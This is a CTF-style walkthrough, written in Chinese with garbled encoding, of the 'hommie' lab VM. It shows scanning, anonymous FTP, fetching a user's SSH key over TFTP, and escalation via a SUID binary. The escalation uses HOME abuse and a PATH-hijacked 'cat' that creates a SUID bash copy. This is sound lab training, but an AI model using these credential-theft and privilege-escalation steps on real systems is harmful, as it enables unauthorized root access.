### ä¸»æœºå‘ç°

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# arp-scan -I eth1 -l

192.168.56.121  08:00:27:08:82:6e       PCS Systemtechnik GmbH
```

ä¸»æœºåœ°å€ä¸ºï¼š`192.168.56.121 `

### ç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# nmap -p- 192.168.56.121                      

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# nmap -sT -sC -sV -O -p21,22,80 192.168.56.121
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 02:48 CST
Nmap scan report for 192.168.56.121
Host is up (0.00083s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:08:82:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
```

å¼€æ”¾äº†21ï¼Œ22å’Œ80ä¸‰ä¸ªç«¯å£ï¼Œå…¶ä¸­21çš„ftpç‰ˆæœ¬æœ‰å¼±å£ä»¤æ¼æ´ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯`ftp`

### æ¢æµ‹80ç«¯å£

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# curl 192.168.56.121                                                            
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

è¯´`alexia`çš„id_rsaæ³„éœ²äº†

å¸¸è§„çš„ç›®å½•æšä¸¾å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰

### åˆ©ç”¨21ç«¯å£å¼±å£ä»¤æ¼æ´

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# ftp 192.168.56.121
Connected to 192.168.56.121.
220 (vsFTPd 3.0.3)
Name (192.168.56.121:root): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

æˆåŠŸç”¨`ftp`ç™»å½•ä¸Šå»

```bash
ftp> ls -a
229 Entering Extended Passive Mode (|||24510|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.

ftp> cd .web
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||47785|)
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
```

æœ‰ä¸¤ä¸ª`index.html`æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå’Œ80ç«¯å£çš„å†…å®¹ä¸€æ ·ï¼Œä¸€ä¸ªæ˜¯ç©ºçš„

```bash
#.webç›®å½•ä¸‹
ftp> pwd
Remote directory: /.web
ftp> get index.html webindex.html
local: webindex.html remote: index.html
229 Entering Extended Passive Mode (|||56726|)
150 Opening BINARY mode data connection for index.html (99 bytes).
100% |**************************************************************************************************|    99        2.05 MiB/s    00:00 ETA
226 Transfer complete.
99 bytes received in 00:00 (140.31 KiB/s)

#æ ¹ç›®å½•ä¸‹
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
Remote directory: /
ftp> get index.html index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||49600|)
150 Opening BINARY mode data connection for index.html (0 bytes).
     0        0.00 KiB/s 
226 Transfer complete.
ftp> quit
221 Goodbye.
                                                                                                                                               
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# ls
index.html  webindex.html
                                                                                  
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# cat index.html                                                                        
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# cat webindex.html
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

### UDPç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# nmap -sU --top-ports 100 192.168.56.121
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 03:02 CST
Nmap scan report for 192.168.56.121
Host is up (0.00083s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:08:82:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 122.16 seconds
```

æ²ƒè¶£ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ‰«ä¹Ÿä¸è¿™æ ·å•ŠğŸ’”

```bash
#ç¬¬ä¸€æ¬¡æ‰«
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# nmap -sU --top-ports 100 192.168.56.121
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 03:07 CST
Nmap scan report for 192.168.56.121
Host is up (0.00080s latency).
All 100 scanned ports on 192.168.56.121 are in ignored states.
Not shown: 59 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response)
MAC Address: 08:00:27:08:82:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 72.83 seconds
```

åé¢æ˜¯æ‰«top20æ‰çŸ¥åˆ°çš„

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# nmap -sU --top-ports 20 192.168.56.121
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 03:09 CST
Nmap scan report for 192.168.56.121
Host is up (0.00067s latency).

PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
(...çœç•¥æ‰closed...)
```

tftpé»˜è®¤æ˜¯æ— è®¤è¯ç™»å½•çš„

### ç™»å½•tftp

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# tftp 192.168.56.121           
tftp> help
tftp-hpa 5.3
Commands may be abbreviated.  Commands are:

connect         connect to remote tftp
mode            set file transfer mode
put             send file
get             receive file
quit            exit tftp
verbose         toggle verbose mode
trace           toggle packet tracing
literal         toggle literal mode, ignore ':' in file name
status          show current status
binary          set mode to octet
ascii           set mode to netascii
rexmt           set per-packet transmission timeout
timeout         set total retransmission timeout
?               print help information
help            print help information
tftp> 
```

tftpæ˜¯æ²¡æœ‰`ls`çš„

åŸºäºæ‰¾`id_rsa`ï¼Œæ‰€ä»¥ç›´æ¥`get id_rsa`

```bash
tftp> get id_rsa
tftp> q
                                                     
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# ls          
id_rsa  index.html  webindex.html
```

### ç™»å½•alexia

```bash
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# chmod 600 id_rsa 
                                                            
â”Œâ”€â”€(rootã‰¿xhh)-[~/Desktop/xhh/HMV/hommie]
â””â”€# ssh alexia@192.168.56.121 -i id_rsa 
(...)
alexia@hommie:~$ 
```

#### user.txt

```bash
alexia@hommie:~$ cat user.txt 
Imnotroot
```

### ææƒ

```bash
alexia@hommie:~$ ls -al /opt
total 28
drwxr-xr-x  2 root root  4096 Sep 30  2020 .
drwxr-xr-x 18 root root  4096 Sep 30  2020 ..
-rwsr-sr-x  1 root root 16720 Sep 30  2020 showMetheKey
```

æœå¯»å¸¸è§„çš„`tmpï¼Œhomeï¼Œopt`æ—¶ï¼Œåœ¨`opt`ä¸‹å‘ç°å¸¦`SUID`æƒé™çš„æ–‡ä»¶

æ‰§è¡Œå‘ç°æ˜¯ä¹‹å‰æ³„éœ²çš„å¯†é’¥

**æŸ¥çœ‹`showMetheKey`**

```bash
alexia@hommie:/opt$ strings showMetheKey 
(...)
cat $HOME/.ssh/id_rsa
```

çœ‹åˆ°è¿™æ¡å‘½ä»¤ï¼Œä¸¤ç§ç›´æ¥æ€è·¯ï¼Œå‘½ä»¤åŠ«æŒå’Œç¯å¢ƒå˜é‡åŠ«æŒ

#### ç¯å¢ƒå˜é‡åŠ«æŒææƒ

```bash
#æ›´æ”¹ç¯å¢ƒå˜é‡
alexia@hommie:/opt$ export HOME=/root
alexia@hommie:/tmp$ $HOME
-bash: /root: Is a directory
#æ›´æ”¹æˆåŠŸ
alexia@hommie:/opt$ ./showMetheKey 
-----BEGIN OPENSSH PRIVATE KEY-----
(...ä¸ä¸€æ ·çš„ç§é’¥...)
-----END OPENSSH PRIVATE KEY-----
```

æ‹¿ç§é’¥ç™»å½•rootå°±å¯ä»¥äº†

#### catå‘½ä»¤åŠ«æŒææƒ

```bash
#æ¢å¤ç¯å¢ƒå
alexia@hommie:/tmp$ $HOME
-bash: /home/alexia: Is a directory
#åœ¨tmpç›®å½•ä¸‹å†™å…¥æ¶æ„å‘½ä»¤åˆ°åŒåæ–‡ä»¶catä¸­ï¼Œå¹¶ç»™catæ‰§è¡Œæƒé™
alexia@hommie:/tmp$ echo "cp /bin/bash /tmp/xhh; chmod +s /tmp/xhh" > cat
alexia@hommie:/tmp$ chmod +x cat
#å°† /tmp ç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ PATH çš„æœ€å‰ç«¯
alexia@hommie:/tmp$ export PATH=/tmp:$PATH
alexia@hommie:/tmp$ $PATH
-bash: /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games: No such file or directory
#æ›´æ”¹æˆåŠŸæ‰§è¡ŒshowMetheKey 
alexia@hommie:/tmp$ /opt/showMetheKey 
alexia@hommie:/tmp$ ls -al
total 1180
drwxrwxrwt  8 root   root      4096 Nov 29 14:32 .
drwxr-xr-x 18 root   root      4096 Sep 30  2020 ..
-rwxr-xr-x  1 alexia alexia      41 Nov 29 14:31 cat
-rwsr-sr-x  1 root   root   1168776 Nov 29 14:32 xhh
#æˆåŠŸç”Ÿæˆå¸¦sæƒé™çš„xhh
```

```bash
alexia@hommie:/tmp$ xhh -p
xhh-5.0# id
uid=1000(alexia) gid=1000(alexia) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
xhh-5.0# 
```

å¾—åˆ°rootæƒé™

#### root.txt

```bash
root@hommie:~# ls
note.txt
root@hommie:~# cat note.txt
I dont remember where I stored root.txt !!!
#æ‰¾ä¸€ä¸‹å°±è¡Œäº†
root@hommie:~# find / -name "root.txt"
/usr/include/root.txt
root@hommie:~# cat /usr/include/root.txt
Imnotbatman
```

